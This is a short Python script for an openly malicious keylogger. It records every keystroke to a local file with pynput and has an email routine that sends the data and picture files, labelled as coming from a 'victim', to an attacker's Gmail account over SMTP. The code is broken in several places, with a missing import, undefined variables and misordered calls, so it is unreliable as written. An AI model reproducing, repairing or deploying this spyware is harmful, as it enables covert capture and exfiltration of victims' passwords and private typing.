import smtplib
import sys
from email.message import EmailMessage
from pynput import keyboard

import os 

smtp = smtplib.SMTP('smtp.gmail.com', 587)
smtp.ehlo() 
smtp.starttls() 


# Log into your email with password

smtp.login('email','password')


def constructemail():
    data = base64.b64encode(data)
    data = 'New data from victim(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

    for pic in pics_names:
        data = base64.b64encode(open(pic, 'r+').read())
        data = 'New pic data from victim(Base64 encoded)\n' + data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, msg.as_string())
        server.close()

    
    
constructemail()


def logKeys():
    
    def on_press(key):
        try:
            with open("keylog.txt","a") as logFile:
                logFile.write(f"{key.char}")
        except AttributeError:
            with open("keylog.txt","a") as logFile:
                logFile.write("f{key}")
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()




if __name__ == "__main__":
    logKeys()
    constructemail()